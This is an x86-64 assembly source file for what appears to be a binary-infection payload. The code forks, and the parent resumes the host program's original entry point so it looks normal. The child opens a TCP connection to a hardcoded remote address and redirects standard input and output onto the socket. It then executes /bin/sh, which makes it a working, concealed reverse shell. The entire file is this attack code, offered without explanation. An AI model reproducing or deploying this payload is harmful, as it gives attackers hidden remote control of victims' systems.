BITS 64

SECTION .text
global main

main:
    push rax ; save all clobbered registers
    push rcx ; (rcx and r11 destroyed by kernel)
    push rdx
    push rsi
    push rdi
    push r11

    mov rax, 57 ; fork
    syscall
    cmp rax, 0
    je connect_back

cleanup:
    pop r11
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rax

    push 0x400400; jump to original entry point
    ret

connect_back:
    ; mov rax,1 ; sys_write
    ; mov rdi,1 ; stdout
    ; lea rsi,[rel $+hello-$] ; hello
    ; mov rdx,[rel $+len-$] ; len
    ; syscall

    mov rax, 41     ; socket syscall number
    mov rdi, 2      ; domain AF_INET
    mov rsi, 1      ; type SOCK_STREAM (TCP)
    mov rdx, 0      ; protocol
    syscall         ; socket(AF_INET,SOCK_STREAM,0)

    mov r10, rax    ; save FD for later

    push DWORD 0x1b64dc0a
    push WORD 0x611e
    push WORD 0x2

    mov rax, 42     ; connect syscall number
    mov rdi, r10
    mov rsi, rsp
    mov rdx, 0x16
    syscall         ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

    mov rax, 33     ; dup2 syscall number
    mov rdi, r10    
    mov rsi, 0  
    syscall         ; dup2(s, 0);
    
    mov rax, 33     ; dup2 syscall number
    mov rdi, r10
    mov rsi, 1
    syscall         ; dup2(s, 1);
    
    mov rax, 33     ; dup2 syscall number
    mov rdi, r10
    mov rsi, 2
    syscall         ; dup2(s, 2);

    mov rax, 59     ; dup2 syscall number
    lea rdi,[rel $+shellcode-$] ; 
    mov rsi, 0      ; 
    mov rdx, 0      ; 
    syscall         ; execve("/bin/sh", 0, 0);

exit:
    mov rax, 60
    syscall

hello: db "hello world",33,10
amp: db "&",0
shellcode: db "/bin/sh",0
